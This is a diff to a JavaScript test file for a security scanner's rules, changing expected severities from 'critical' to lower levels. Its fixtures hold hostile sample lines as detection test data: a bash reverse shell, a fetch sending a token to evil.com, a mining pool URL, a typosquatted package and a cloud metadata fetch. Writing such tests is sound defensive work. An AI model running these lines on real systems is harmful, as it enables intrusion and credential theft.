@@ -40,7 +40,7 @@ describe("env-leak", () => {
       `fetch("https://evil.com", { body: token });`,
     ].join("\n"));
     const findings = envLeakRule.run([f]);
-    assert.ok(findings.some((f) => f.severity === "critical"));
+    assert.ok(findings.some((f) => f.severity === "medium"));
   });
 
   it("does NOT flag env access without HTTP", () => {
@@ -55,7 +55,7 @@ describe("crypto-mining", () => {
   it("detects stratum protocol", () => {
     const f = makeFile("miner.js", `const pool = "stratum+tcp://pool.example.com:3333";`);
     const findings = cryptoMiningRule.run([f]);
-    assert.ok(findings.some((f) => f.severity === "critical"));
+    assert.ok(findings.some((f) => f.severity === "high"));
   });
 
   it("detects xmrig reference", () => {
@@ -76,7 +76,7 @@ describe("reverse-shell", () => {
   it("detects bash reverse shell", () => {
     const f = makeFile("evil.sh", `bash -i >& /dev/tcp/10.0.0.1/4444 0>&1`);
     const findings = reverseShellRule.run([f]);
-    assert.ok(findings.some((f) => f.severity === "critical"));
+    assert.ok(findings.some((f) => f.severity === "high"));
   });
 
   it("detects netcat reverse shell", () => {
@@ -97,7 +97,7 @@ describe("typosquatting", () => {
   it("detects typosquatted lodash", () => {
     const f = makeFile("package.json", `{"dependencies": {"1odash": "^4.0.0"}}`);
     const findings = typosquattingRule.run([f]);
-    assert.ok(findings.some((f) => f.severity === "critical"));
+    assert.ok(findings.some((f) => f.severity === "low"));
   });
 
   it("does NOT flag legitimate packages", () => {
@@ -221,7 +221,7 @@ describe("network-ssrf", () => {
   it("detects AWS metadata endpoint", () => {
     const f = makeFile("ssrf.js", `fetch("http://169.254.169.254/latest/meta-data/");`);
     const findings = networkSsrfRule.run([f]);
-    assert.ok(findings.some((f) => f.severity === "critical"));
+    assert.ok(findings.some((f) => f.severity === "medium"));
   });
 
   it("detects fetch from req params", () => {
